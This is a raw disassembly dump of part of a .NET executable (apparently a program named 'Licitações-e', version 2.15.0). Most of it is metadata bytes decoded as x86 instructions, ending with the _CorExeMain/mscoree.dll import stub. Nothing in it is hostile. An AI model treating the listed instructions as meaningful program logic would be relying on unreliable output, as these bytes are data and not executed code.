  4090ea:	ff 03                	incl   (%ebx)
  4090ec:	06                   	push   %es
  4090ed:	12 1c 12             	adc    (%edx,%edx,1),%bl
  4090f0:	20 03                	and    %al,(%ebx)
  4090f2:	15 12 79 02 0e       	adc    $0xe027912,%eax
  4090f7:	12 7d 0e             	adc    0xe(%ebp),%bh
  4090fa:	0e                   	push   %cs
  4090fb:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409100:	80 81 0c 20 04 08 0e 	addb   $0xe,0x804200c(%ecx)
  409107:	0e                   	push   %cs
  409108:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  40910d:	51                   	push   %ecx
  40910e:	08 0d 20 06 12 80    	or     %cl,0x80120620
  409114:	85 0e                	test   %ecx,(%esi)
  409116:	0e                   	push   %cs
  409117:	0e                   	push   %cs
  409118:	0e                   	push   %cs
  409119:	11 25 11 29 09 20    	adc    %esp,0x20092911
  40911f:	04 12                	add    $0x12,%al
  409121:	80 85 0e 0e 0e 0e 04 	addb   $0x4,0xe0e0e0e(%ebp)
  409128:	20 00                	and    %al,(%eax)
  40912a:	12 11                	adc    (%ecx),%dl
  40912c:	05 20 00 12 80       	add    $0x80120020,%eax
  409131:	89 08                	mov    %ecx,(%eax)
  409133:	20 03                	and    %al,(%ebx)
  409135:	01 11                	add    %edx,(%ecx)
  409137:	2d 11 2d 0e 03       	sub    $0x30e2d11,%eax
  40913c:	06                   	push   %es
  40913d:	12 30                	adc    (%eax),%dh
  40913f:	06                   	push   %es
  409140:	20 02                	and    %al,(%edx)
  409142:	01 0a                	add    %ecx,(%edx)
  409144:	12 6d 04             	adc    0x4(%ebp),%ch
  409147:	28 00                	sub    %al,(%eax)
  409149:	12 11                	adc    (%ecx),%dl
  40914b:	03 06                	add    (%esi),%eax
  40914d:	12 50 03             	adc    0x3(%eax),%dl
  409150:	06                   	push   %es
  409151:	12 44 04 06          	adc    0x6(%esp,%eax,1),%al
  409155:	12 80 8d 04 06 11    	adc    0x1106048d(%eax),%al
  40915b:	80 91 07 20 02 01 12 	adcb   $0x12,0x1022007(%ecx)
  409162:	50                   	push   %eax
  409163:	12 44 04 20          	adc    0x20(%esp,%eax,1),%al
  409167:	00 12                	add    %dl,(%edx)
  409169:	7d 03                	jge    0x40916e
  40916b:	06                   	push   %es
  40916c:	12 7d 05             	adc    0x5(%ebp),%bh
  40916f:	20 00                	and    %al,(%eax)
  409171:	12 80 8d 05 20 00    	adc    0x20058d(%eax),%al
  409177:	11 80 91 04 20 00    	adc    %eax,0x200491(%eax)
  40917d:	12 19                	adc    (%ecx),%bl
  40917f:	05 20 00 12 80       	add    $0x80120020,%eax
  409184:	95                   	xchg   %eax,%ebp
  409185:	04 28                	add    $0x28,%al
  409187:	00 12                	add    %dl,(%edx)
  409189:	7d 05                	jge    0x409190
  40918b:	28 00                	sub    %al,(%eax)
  40918d:	12 80 8d 05 28 00    	adc    0x28058d(%eax),%al
  409193:	11 80 91 04 28 00    	adc    %eax,0x280491(%eax)
  409199:	12 19                	adc    (%ecx),%bl
  40919b:	05 28 00 12 80       	add    $0x80120028,%eax
  4091a0:	95                   	xchg   %eax,%ebp
  4091a1:	05 20 01 01 12       	add    $0x12010120,%eax
  4091a6:	44                   	inc    %esp
  4091a7:	04 20                	add    $0x20,%al
  4091a9:	01 01                	add    %eax,(%ecx)
  4091ab:	02 05 00 01 08 1d    	add    0x1d080100,%al
  4091b1:	0e                   	push   %cs
  4091b2:	07                   	pop    %es
  4091b3:	00 02                	add    %al,(%edx)
  4091b5:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  4091b8:	80 99 06 20 01 01 11 	sbbb   $0x11,0x1012006(%ecx)
  4091bf:	80 a1 01 02 01 15 05 	andb   $0x5,0x15010201(%ecx)
  4091c6:	20 02                	and    %al,(%edx)
  4091c8:	01 0e                	add    %ecx,(%esi)
  4091ca:	08 04 00             	or     %al,(%eax,%eax,1)
  4091cd:	01 02                	add    %eax,(%edx)
  4091cf:	0e                   	push   %cs
  4091d0:	06                   	push   %es
  4091d1:	10 01                	adc    %al,(%ecx)
  4091d3:	01 08                	add    %ecx,(%eax)
  4091d5:	1e                   	push   %ds
  4091d6:	00 04 0a             	add    %al,(%edx,%ecx,1)
  4091d9:	01 11                	add    %edx,(%ecx)
  4091db:	0c 0f                	or     $0xf,%al
  4091dd:	07                   	pop    %es
  4091de:	07                   	pop    %es
  4091df:	12 21                	adc    (%ecx),%ah
  4091e1:	12 21                	adc    (%ecx),%ah
  4091e3:	11 0c 02             	adc    %ecx,(%edx,%eax,1)
  4091e6:	11 10                	adc    %edx,(%eax)
  4091e8:	11 14 12             	adc    %edx,(%edx,%edx,1)
  4091eb:	18 06                	sbb    %al,(%esi)
  4091ed:	20 01                	and    %al,(%ecx)
  4091ef:	01 11                	add    %edx,(%ecx)
  4091f1:	80 e5 05             	and    $0x5,%ch
  4091f4:	20 02                	and    %al,(%edx)
  4091f6:	01 08                	add    %ecx,(%eax)
  4091f8:	08 04 20             	or     %al,(%eax,%eiz,1)
  4091fb:	01 01                	add    %eax,(%ecx)
  4091fd:	0d 08 14 11 39       	or     $0x39111408,%eax
  409202:	02 00                	add    (%eax),%al
  409204:	02 00                	add    (%eax),%al
  409206:	00 07                	add    %al,(%edi)
  409208:	20 02                	and    %al,(%edx)
  40920a:	10 11                	adc    %dl,(%ecx)
  40920c:	39 08                	cmp    %ecx,(%eax)
  40920e:	08 0b                	or     %cl,(%ebx)
  409210:	20 04 01             	and    %al,(%ecx,%eax,1)
  409213:	03 11                	add    (%ecx),%edx
  409215:	2d 11 2d 11 80       	sub    $0x80112d11,%eax
  40921a:	f1                   	int1
  40921b:	0c 07                	or     $0x7,%al
  40921d:	03 14 11             	add    (%ecx,%edx,1),%edx
  409220:	39 02                	cmp    %eax,(%edx)
  409222:	00 02                	add    %al,(%edx)
  409224:	00 00                	add    %al,(%eax)
  409226:	08 08                	or     %cl,(%eax)
  409228:	04 07                	add    $0x7,%al
  40922a:	01 11                	add    %edx,(%ecx)
  40922c:	35 04 07 01 11       	xor    $0x11010704,%eax
  409231:	31 05 00 00 12 80    	xor    %eax,0x80120000
  409237:	f5                   	cmc
  409238:	05 20 02 01 0c       	add    $0xc010220,%eax
  40923d:	0c 06                	or     $0x6,%al
  40923f:	20 01                	and    %al,(%ecx)
  409241:	01 11                	add    %edx,(%ecx)
  409243:	80 f9 06             	cmp    $0x6,%cl
  409246:	20 01                	and    %al,(%ecx)
  409248:	01 11                	add    %edx,(%ecx)
  40924a:	81 01 06 20 01 01    	addl   $0x1012006,(%ecx)
  409250:	11 81 0d 08 00 01    	adc    %eax,0x100080d(%ecx)
  409256:	12 81 11 12 80 ed    	adc    -0x127fedef(%ecx),%al
  40925c:	05 20 00 11 81       	add    $0x81110020,%eax
  409261:	15 06 20 01 01       	adc    $0x1012006,%eax
  409266:	11 81 19 05 20 00    	adc    %eax,0x200519(%ecx)
  40926c:	12 81 1d 06 20 01    	adc    0x120061d(%ecx),%al
  409272:	01 12                	add    %edx,(%edx)
  409274:	80 ed 07             	sub    $0x7,%ch
  409277:	20 04 01             	and    %al,(%ecx,%eax,1)
  40927a:	08 08                	or     %cl,(%eax)
  40927c:	08 08                	or     %cl,(%eax)
  40927e:	04 00                	add    $0x0,%al
  409280:	01 0e                	add    %ecx,(%esi)
  409282:	18 05 20 01 01 11    	sbb    %al,0x11010120
  409288:	49                   	dec    %ecx
  409289:	05 00 02 08 08       	add    $0x8080200,%eax
  40928e:	08 07                	or     %al,(%edi)
  409290:	20 01                	and    %al,(%ecx)
  409292:	01 1d 12 80 ed 06    	add    %ebx,0x6ed8012
  409298:	20 01                	and    %al,(%ecx)
  40929a:	01 11                	add    %edx,(%ecx)
  40929c:	81 25 06 20 01 01 11 	andl   $0x5298111,0x1012006
  4092a3:	81 29 05 
  4092a6:	00 00                	add    %al,(%eax)
  4092a8:	12 81 2d 06 00 01    	adc    0x100062d(%ecx),%al
  4092ae:	12 81 31 0e 06 20    	adc    0x20060e31(%ecx),%al
  4092b4:	01 01                	add    %eax,(%ecx)
  4092b6:	12 81 31 06 20 01    	adc    0x1200631(%ecx),%al
  4092bc:	01 12                	add    %edx,(%edx)
  4092be:	81 35 04 20 00 11 49 	xorl   $0xa071a49,0x11002004
  4092c5:	1a 07 0a 
  4092c8:	12 15 12 71 12 81    	adc    0x81127112,%dl
  4092ce:	05 12 81 09 12       	add    $0x12098112,%eax
  4092d3:	81 09 0e 0e 11 49    	orl    $0x49110e0e,(%ecx)
  4092d9:	11 81 15 1d 12 80    	adc    %eax,-0x7fede2eb(%ecx)
  4092df:	ed                   	in     (%dx),%eax
  4092e0:	06                   	push   %es
  4092e1:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  4092e6:	51                   	push   %ecx
  4092e7:	09 20                	or     %esp,(%eax)
  4092e9:	00 15 12 81 41 01    	add    %dl,0x1418112
  4092ef:	13 00                	adc    (%eax),%eax
  4092f1:	07                   	pop    %es
  4092f2:	15 12 81 41 01       	adc    $0x1418112,%eax
  4092f7:	12 51 04             	adc    0x4(%ecx),%dl
  4092fa:	20 00                	and    %al,(%eax)
  4092fc:	13 00                	adc    (%eax),%eax
  4092fe:	07                   	pop    %es
  4092ff:	20 02                	and    %al,(%edx)
  409301:	01 12                	add    %edx,(%edx)
  409303:	80 ed 0e             	sub    $0xe,%ch
  409306:	25 07 0f 12 15       	and    $0x15120f07,%eax
  40930b:	1d 12 81 39 12       	sbb    $0x12398112,%eax
  409310:	81 3d 12 81 09 08 08 	cmpl   $0x8711208,0x8098112
  409317:	12 71 08 
  40931a:	08 12                	or     %dl,(%edx)
  40931c:	51                   	push   %ecx
  40931d:	08 08                	or     %cl,(%eax)
  40931f:	11 81 15 11 81 15    	adc    %eax,0x15811115(%ecx)
  409325:	15 12 81 41 01       	adc    $0x1418112,%eax
  40932a:	12 51 06             	adc    0x6(%ecx),%dl
  40932d:	07                   	pop    %es
  40932e:	02 12                	add    (%edx),%dl
  409330:	21 1d 05 09 07 03    	and    %ebx,0x3070905
  409336:	12 2c 12             	adc    (%edx,%edx,1),%ch
  409339:	71 11                	jno    0x40934c
  40933b:	81 15 05 20 02 01 1c 	adcl   $0x2006181c,0x1022005
  409342:	18 06 20 
  409345:	01 01                	add    %eax,(%ecx)
  409347:	12 81 51 04 20 00    	adc    0x200451(%ecx),%al
  40934d:	11 55 04             	adc    %edx,0x4(%ebp)
  409350:	20 01                	and    %al,(%ecx)
  409352:	03 08                	add    (%eax),%ecx
  409354:	04 20                	add    $0x20,%al
  409356:	01 01                	add    %eax,(%ecx)
  409358:	03 06                	add    (%esi),%eax
  40935a:	20 01                	and    %al,(%ecx)
  40935c:	01 11                	add    %edx,(%ecx)
  40935e:	81 55 05 20 00 11 81 	adcl   $0x81110020,0x5(%ebp)
  409365:	55                   	push   %ebp
  409366:	04 00                	add    $0x0,%al
  409368:	00 11                	add    %dl,(%ecx)
  40936a:	65 05 00 01 11 65    	gs add $0x65110100,%eax
  409370:	0e                   	push   %cs
  409371:	04 07                	add    $0x7,%al
  409373:	01 11                	add    %edx,(%ecx)
  409375:	2d 05 20 01 01       	sub    $0x1012005,%eax
  40937a:	11 65 06             	adc    %esp,0x6(%ebp)
  40937d:	20 01                	and    %al,(%ecx)
  40937f:	01 12                	add    %edx,(%edx)
  409381:	81 61 06 15 12 61 01 	andl   $0x1611215,0x6(%ecx)
  409388:	11 34 05 20 01 13 00 	adc    %esi,0x130120(,%eax,1)
  40938f:	08 05 20 00 12 81    	or     %al,0x81120020
  409395:	65 09 20             	or     %esp,%gs:(%eax)
  409398:	02 01                	add    (%ecx),%al
  40939a:	12 81 65 11 81 69    	adc    0x69811165(%ecx),%al
  4093a0:	06                   	push   %es
  4093a1:	20 01                	and    %al,(%ecx)
  4093a3:	01 12                	add    %edx,(%edx)
  4093a5:	81 65 06 20 01 01 11 	andl   $0x11010120,0x6(%ebp)
  4093ac:	81 6d 05 20 00 11 81 	subl   $0x81110020,0x5(%ebp)
  4093b3:	71 05                	jno    0x4093ba
  4093b5:	20 01                	and    %al,(%ecx)
  4093b7:	01 13                	add    %edx,(%ebx)
  4093b9:	00 06                	add    %al,(%esi)
  4093bb:	20 02                	and    %al,(%edx)
  4093bd:	01 08                	add    %ecx,(%eax)
  4093bf:	13 00                	adc    (%eax),%eax
  4093c1:	06                   	push   %es
  4093c2:	20 03                	and    %al,(%ebx)
  4093c4:	01 08                	add    %ecx,(%eax)
  4093c6:	08 08                	or     %cl,(%eax)
  4093c8:	03 20                	add    (%eax),%esp
  4093ca:	00 0d 07 00 04 0e    	add    %cl,0xe040007
  4093d0:	0e                   	push   %cs
  4093d1:	1c 1c                	sbb    $0x1c,%al
  4093d3:	1c 05                	sbb    $0x5,%al
  4093d5:	00 02                	add    %al,(%edx)
  4093d7:	0e                   	push   %cs
  4093d8:	0e                   	push   %cs
  4093d9:	0e                   	push   %cs
  4093da:	03 00                	add    (%eax),%eax
  4093dc:	00 01                	add    %al,(%ecx)
  4093de:	2d 07 14 08 08       	sub    $0x8081407,%eax
  4093e3:	08 11                	or     %dl,(%ecx)
  4093e5:	34 08                	xor    $0x8,%al
  4093e7:	08 08                	or     %cl,(%eax)
  4093e9:	08 08                	or     %cl,(%eax)
  4093eb:	11 81 79 11 81 15    	adc    %eax,0x15811179(%ecx)
  4093f1:	11 81 15 11 81 15    	adc    %eax,0x15811115(%ecx)
  4093f7:	11 81 15 11 81 15    	adc    %eax,0x15811115(%ecx)
  4093fd:	11 81 15 11 81 15    	adc    %eax,0x15811115(%ecx)
  409403:	11 81 15 11 81 15    	adc    %eax,0x15811115(%ecx)
  409409:	11 81 15 05 07 02    	adc    %eax,0x2070515(%ecx)
  40940f:	19 11                	sbb    %edx,(%ecx)
  409411:	3c 06                	cmp    $0x6,%al
  409413:	00 02                	add    %al,(%edx)
  409415:	11 49 0e             	adc    %ecx,0xe(%ecx)
  409418:	0e                   	push   %cs
  409419:	07                   	pop    %es
  40941a:	15 12 79 02 0e       	adc    $0xe027912,%eax
  40941f:	12 7d 07             	adc    0x7(%ebp),%bh
  409422:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409427:	80 81 08 15 12 81 41 	addb   $0x41,-0x7eedeaf8(%ecx)
  40942e:	01 12                	add    %edx,(%edx)
  409430:	80 81 08 00 01 12 81 	addb   $0x81,0x12010008(%ecx)
  409437:	89 11                	mov    %edx,(%ecx)
  409439:	81 8d 06 00 01 12 81 	orl    $0x50e8981,0x12010006(%ebp)
  409440:	89 0e 05 
  409443:	20 00                	and    %al,(%eax)
  409445:	12 81 89 06 00 03    	adc    0x3000689(%ecx),%al
  40944b:	0e                   	push   %cs
  40944c:	0e                   	push   %cs
  40944d:	0e                   	push   %cs
  40944e:	0e                   	push   %cs
  40944f:	09 20                	or     %esp,(%eax)
  409451:	01 12                	add    %edx,(%edx)
  409453:	81 89 1d 12 81 89 05 	orl    $0x121d0605,-0x767eede3(%ecx)
  40945a:	06 1d 12 
  40945d:	81 89 13 20 04 12 81 	orl    $0x81119581,0x12042013(%ecx)
  409464:	95 11 81 
  409467:	99                   	cltd
  409468:	12 81 9d 1d 12 81    	adc    -0x7eede263(%ecx),%al
  40946e:	89 1d 11 81 a1 05    	mov    %ebx,0x5a18111
  409474:	20 01                	and    %al,(%ecx)
  409476:	1c 1d                	sbb    $0x1d,%al
  409478:	1c 06                	sbb    $0x6,%al
  40947a:	00 03                	add    %al,(%ebx)
  40947c:	0e                   	push   %cs
  40947d:	0e                   	push   %cs
  40947e:	1c 1c                	sbb    $0x1c,%al
  409480:	07                   	pop    %es
  409481:	00 02                	add    %al,(%edx)
  409483:	1c 1c                	sbb    $0x1c,%al
  409485:	12 81 89 0d 20 05    	adc    0x5200d89(%ecx),%al
  40948b:	1c 0e                	sbb    $0xe,%al
  40948d:	11 81 99 12 81 9d    	adc    %eax,-0x627eed67(%ecx)
  409493:	1c 1d                	sbb    $0x1d,%al
  409495:	1c 04                	sbb    $0x4,%al
  409497:	20 01                	and    %al,(%ecx)
  409499:	01 1c 07             	add    %ebx,(%edi,%eax,1)
  40949c:	20 02                	and    %al,(%edx)
  40949e:	01 13                	add    %edx,(%ebx)
  4094a0:	00 13                	add    %dl,(%ebx)
  4094a2:	01 09                	add    %ecx,(%ecx)
  4094a4:	00 02                	add    %al,(%edx)
  4094a6:	02 12                	add    (%edx),%dl
  4094a8:	81 89 12 81 89 05 00 	orl    $0xe0e0200,0x5898112(%ecx)
  4094af:	02 0e 0e 
  4094b2:	1c 05                	sbb    $0x5,%al
  4094b4:	00 02                	add    %al,(%edx)
  4094b6:	02 0e                	add    (%esi),%cl
  4094b8:	0e                   	push   %cs
  4094b9:	3e 07                	ds pop %es
  4094bb:	17                   	pop    %ss
  4094bc:	0e                   	push   %cs
  4094bd:	0e                   	push   %cs
  4094be:	15 12 79 02 0e       	adc    $0xe027912,%eax
  4094c3:	12 7d 12             	adc    0x12(%ebp),%bh
  4094c6:	80 81 12 81 89 12 81 	addb   $0x81,0x12898112(%ecx)
  4094cd:	89 12                	mov    %edx,(%edx)
  4094cf:	81 89 12 81 95 1c 08 	orl    $0x121c0e08,0x1c958112(%ecx)
  4094d6:	0e 1c 12 
  4094d9:	81 ad 12 81 a9 1c 0e 	subl   $0x8580120e,0x1ca98112(%ebp)
  4094e0:	12 80 85 
  4094e3:	12 80 89 12 81 ad    	adc    -0x527eed77(%eax),%al
  4094e9:	15 12 81 41 01       	adc    $0x1418112,%eax
  4094ee:	12 80 81 03 1d 12    	adc    0x121d0381(%eax),%al
  4094f4:	81 89 1d 1c 03 07 01 	orl    $0x20040801,0x7031c1d(%ecx)
  4094fb:	08 04 20 
  4094fe:	00 1d 03 07 20 02    	add    %bl,0x2200703
  409504:	01 0e                	add    %ecx,(%esi)
  409506:	12 80 89 0b 07 05    	adc    0x5070b89(%eax),%al
  40950c:	12 18                	adc    (%eax),%bl
  40950e:	12 80 89 03 1d 03    	adc    0x31d0389(%eax),%al
  409514:	08 03                	or     %al,(%ebx)
  409516:	07                   	pop    %es
  409517:	01 0e                	add    %ecx,(%esi)
  409519:	06                   	push   %es
  40951a:	00 01                	add    %al,(%ecx)
  40951c:	11 81 b5 02 05 20    	adc    %eax,0x200502b5(%ecx)
  409522:	00 11                	add    %dl,(%ecx)
  409524:	81 b9 04 00 01 01 0e 	cmpl   $0x20030e,0x1010004(%ecx)
  40952b:	03 20 00 
  40952e:	03 08                	add    (%eax),%ecx
  409530:	07                   	pop    %es
  409531:	02 12                	add    (%edx),%dl
  409533:	80 89 11 81 b5 09 07 	orb    $0x7,0x9b58111(%ecx)
  40953a:	05 12 80 89 0e       	add    $0xe898012,%eax
  40953f:	03 0e                	add    (%esi),%ecx
  409541:	08 05 00 00 12 81    	or     %al,0x81120000
  409547:	bd 05 00 00 11       	mov    $0x11000005,%ebp
  40954c:	80 91 05 00 01 12 7d 	adcb   $0x7d,0x12010005(%ecx)
  409553:	1c 04                	sbb    $0x4,%al
  409555:	07                   	pop    %es
  409556:	01 12                	add    %edx,(%edx)
  409558:	7d 04                	jge    0x40955e
  40955a:	06                   	push   %es
  40955b:	12 81 c9 07 20 02    	adc    0x22007c9(%ecx),%al
  409561:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  409564:	81 cd 06 20 01 01    	or     $0x1012006,%ebp
  40956a:	12 81 d1 08 15 12    	adc    0x121508d1(%ecx),%al
  409570:	81 d5 01 12 81 d9    	adc    $0xd9811201,%ebp
  409576:	05 20 00 12 81       	add    $0x81120020,%eax
  40957b:	ad                   	lods   %ds:(%esi),%eax
  40957c:	07                   	pop    %es
  40957d:	15 12 81 d5 01       	adc    $0x1d58112,%eax
  409582:	12 7d 06             	adc    0x6(%ebp),%bh
  409585:	20 01                	and    %al,(%ecx)
  409587:	01 12                	add    %edx,(%edx)
  409589:	81 e1 07 00 01 12    	and    $0x12010007,%ecx
  40958f:	81 e9 12 1d 06 20    	sub    $0x20061d12,%ecx
  409595:	01 01                	add    %eax,(%ecx)
  409597:	11 81 ed 05 00 00    	adc    %eax,0x5ed(%ecx)
  40959d:	12 81 f1 06 20 01    	adc    0x12006f1(%ecx),%al
  4095a3:	01 12                	add    %edx,(%edx)
  4095a5:	81 e9 05 20 00 12    	sub    $0x12002005,%ecx
  4095ab:	81 f5 0a 20 00 15    	xor    $0x1500200a,%ebp
  4095b1:	12 81 d5 01 12 81    	adc    -0x7eedfe2b(%ecx),%al
  4095b7:	d9 08                	(bad) (%eax)
  4095b9:	15 12 81 f9 01       	adc    $0x1f98112,%eax
  4095be:	12 81 cd 0b 20 01    	adc    0x1200bcd(%ecx),%al
  4095c4:	01 15 12 81 f9 01    	add    %edx,0x1f98112
  4095ca:	12 81 cd 06 15 12    	adc    0x121506cd(%ecx),%al
  4095d0:	81 d5 01 0e 03 00    	adc    $0x30e01,%ebp
  4095d6:	00 0e                	add    %cl,(%esi)
  4095d8:	06                   	push   %es
  4095d9:	00 03                	add    %al,(%ebx)
  4095db:	08 0e                	or     %cl,(%esi)
  4095dd:	0e                   	push   %cs
  4095de:	02 07                	add    (%edi),%al
  4095e0:	20 02                	and    %al,(%edx)
  4095e2:	02 0e                	add    (%esi),%cl
  4095e4:	11 81 fd 0a 20 03    	adc    %eax,0x3200afd(%ecx)
  4095ea:	1d 0e 1d 0e 08       	sbb    $0x80e1d0e,%eax
  4095ef:	11 82 01 0c 00 04    	adc    %eax,0x4000c01(%edx)
  4095f5:	11 49 0e             	adc    %ecx,0xe(%ecx)
  4095f8:	0e                   	push   %cs
  4095f9:	11 82 05 11 82 09    	adc    %eax,0x9821105(%edx)
  4095ff:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  409604:	03 06                	add    (%esi),%eax
  409606:	20 01                	and    %al,(%ecx)
  409608:	12 82 11 0e 05 00    	adc    0x50e11(%edx),%al
  40960e:	00 12                	add    %dl,(%edx)
  409610:	82 15 09 20 02 01 12 	adcb   $0x12,0x1022009
  409617:	82 11 12             	adcb   $0x12,(%ecx)
  40961a:	82 15 05 00 02 01 0e 	adcb   $0xe,0x1020005
  409621:	0e                   	push   %cs
  409622:	06                   	push   %es
  409623:	20 01                	and    %al,(%ecx)
  409625:	12 81 f1 0e 06 20    	adc    0x20060ef1(%ecx),%al
  40962b:	01 12                	add    %edx,(%edx)
  40962d:	82 29 0e             	subb   $0xe,(%ecx)
  409630:	05 20 00 12 82       	add    $0x82120020,%eax
  409635:	31 06                	xor    %eax,(%esi)
  409637:	00 02                	add    %al,(%edx)
  409639:	02 0e                	add    (%esi),%cl
  40963b:	10 0d 06 20 01 12    	adc    %cl,0x12012006
  409641:	82 2d 08 07 20 02 12 	subb   $0x12,0x2200708
  409648:	81 f1 0e 1c 06 20    	xor    $0x20061c0e,%ecx
  40964e:	01 12                	add    %edx,(%edx)
  409650:	81 f1 1c 1b 30 02    	xor    $0x2301b1c,%ecx
  409656:	05 12 81 d1 15       	add    $0x15d18112,%eax
  40965b:	12 81 d5 01 1e 00    	adc    0x1e01d5(%ecx),%al
  409661:	15 12 81 d5 01       	adc    $0x1d58112,%eax
  409666:	1e                   	push   %ds
  409667:	01 12                	add    %edx,(%edx)
  409669:	82 45 12 82          	addb   $0x82,0x12(%ebp)
  40966d:	41                   	inc    %ecx
  40966e:	1c 05                	sbb    $0x5,%al
  409670:	0a 02                	or     (%edx),%al
  409672:	0e                   	push   %cs
  409673:	12 7d 04             	adc    0x4(%ebp),%bh
  409676:	20 01                	and    %al,(%ecx)
  409678:	02 08                	add    (%eax),%cl
  40967a:	05 20 00 12 82       	add    $0x82120020,%eax
  40967f:	4d                   	dec    %ebp
  409680:	05 20 00 11 82       	add    $0x82110020,%eax
  409685:	51                   	push   %ecx
  409686:	51                   	push   %ecx
  409687:	07                   	pop    %es
  409688:	1f                   	pop    %ds
  409689:	12 54 02 0e          	adc    0xe(%edx,%eax,1),%dl
  40968d:	12 48 12             	adc    0x12(%eax),%cl
  409690:	81 e9 12 81 f1 15    	sub    $0x15f18112,%ecx
  409696:	12 81 d5 01 0e 0e    	adc    0xe0e01d5(%ecx),%al
  40969c:	15 12 81 d5 01       	adc    $0x1d58112,%eax
  4096a1:	12 7d 08             	adc    0x8(%ebp),%bh
  4096a4:	08 0e                	or     %cl,(%esi)
  4096a6:	1d 0e 12 81 2d       	sbb    $0x2d81120e,%eax
  4096ab:	12 82 11 12 82 19    	adc    0x19821211(%edx),%al
  4096b1:	0e                   	push   %cs
  4096b2:	0e                   	push   %cs
  4096b3:	12 82 25 08 12 82    	adc    -0x7dedf7db(%edx),%al
  4096b9:	29 0d 15 12 81 f9    	sub    %ecx,0xf9811215
  4096bf:	01 12                	add    %edx,(%edx)
  4096c1:	81 cd 15 12 81 f9    	or     $0xf9811215,%ebp
  4096c7:	01 12                	add    %edx,(%edx)
  4096c9:	81 cd 12 82 41 12    	or     $0x12418212,%ebp
  4096cf:	58                   	pop    %eax
  4096d0:	08 1d 0e 08 1d 0e    	or     %bl,0xe1d080e
  4096d6:	1d 03 13 01 00       	sbb    $0x11303,%eax
  4096db:	0e                   	push   %cs
  4096dc:	4c                   	dec    %esp
  4096dd:	69 63 69 74 61 c3 a7 	imul   $0xa7c36174,0x69(%ebx),%esp
  4096e4:	c3                   	ret
  4096e5:	b5 65                	mov    $0x65,%ch
  4096e7:	73 2d                	jae    0x409716
  4096e9:	65 00 00             	add    %al,%gs:(%eax)
  4096ec:	05 01 00 00 00       	add    $0x1,%eax
  4096f1:	00 0b                	add    %cl,(%ebx)
  4096f3:	01 00                	add    %eax,(%eax)
  4096f5:	06                   	push   %es
  4096f6:	32 2e                	xor    (%esi),%ch
  4096f8:	31 35 2e 30 00 00    	xor    %esi,0x302e
  4096fe:	08 01                	or     %al,(%ecx)
  409700:	00 08                	add    %cl,(%eax)
  409702:	00 00                	add    %al,(%eax)
  409704:	00 00                	add    %al,(%eax)
  409706:	00 1e                	add    %bl,(%esi)
  409708:	01 00                	add    %eax,(%eax)
  40970a:	01 00                	add    %eax,(%eax)
  40970c:	54                   	push   %esp
  40970d:	02 16                	add    (%esi),%dl
  40970f:	57                   	push   %edi
  409710:	72 61                	jb     0x409773
  409712:	70 4e                	jo     0x409762
  409714:	6f                   	outsl  %ds:(%esi),(%dx)
  409715:	6e                   	outsb  %ds:(%esi),(%dx)
  409716:	45                   	inc    %ebp
  409717:	78 63                	js     0x40977c
  409719:	65 70 74             	gs jo  0x409790
  40971c:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  409723:	77 73                	ja     0x409798
  409725:	01 00                	add    %eax,(%eax)
  409727:	00 50 97             	add    %dl,-0x69(%eax)
	...
  409732:	00 00                	add    %al,(%eax)
  409734:	6e                   	outsb  %ds:(%esi),(%dx)
  409735:	97                   	xchg   %eax,%edi
  409736:	00 00                	add    %al,(%eax)
  409738:	00 20                	add    %ah,(%eax)
	...
  40974e:	00 00                	add    %al,(%eax)
  409750:	60                   	pusha
  409751:	97                   	xchg   %eax,%edi
	...
  409762:	5f                   	pop    %edi
  409763:	43                   	inc    %ebx
  409764:	6f                   	outsl  %ds:(%esi),(%dx)
  409765:	72 45                	jb     0x4097ac
  409767:	78 65                	js     0x4097ce
  409769:	4d                   	dec    %ebp
  40976a:	61                   	popa
  40976b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  409772:	72 65                	jb     0x4097d9
  409774:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  409778:	6c                   	insb   (%dx),%es:(%edi)
  409779:	00 00                	add    %al,(%eax)
  40977b:	00 00                	add    %al,(%eax)
  40977d:	00 ff                	add    %bh,%bh
  40977f:	25 00 20 40 00       	and    $0x402000,%eax
